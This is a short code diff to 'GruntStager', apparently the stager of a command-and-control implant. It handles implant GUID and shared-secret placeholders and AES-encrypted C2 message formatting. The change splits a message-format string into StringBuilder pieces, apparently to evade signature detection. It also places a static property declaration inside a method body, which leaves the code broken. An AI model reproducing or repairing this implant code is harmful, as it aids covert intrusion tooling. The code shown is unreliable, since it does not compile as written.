@@ -25,6 +25,8 @@ namespace GruntStager
         {
             new GruntStager();
         }
+
+        
         public void ExecuteStager()
         {
             try
@@ -43,7 +45,20 @@ namespace GruntStager
                 string aGUID = @"{{REPLACE_GRUNT_GUID}}";
                 string GUID = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
                 byte[] SetupKeyBytes = Convert.FromBase64String(@"{{REPLACE_GRUNT_SHARED_SECRET_PASSWORD}}");
-                string MessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";
+                public static string GetMessageFormat
+                {
+                    get
+                    {
+                        var sb = new StringBuilder(@"{{""GUID"":""{0}"",");
+                        sb.Append(@"""Type"":{1},");
+                        sb.Append(@"""Meta"":""{2}"",");
+                        sb.Append(@"""IV"":""{3}"",");
+                        sb.Append(@"""EncryptedMessage"":""{4}"",");
+                        sb.Append(@"""HMAC"":""{5}""}}");
+                        return sb.ToString();
+                    }
+                }
+
 
                 Aes SetupAESKey = Aes.Create();
                 SetupAESKey.Mode = CipherMode.CBC;
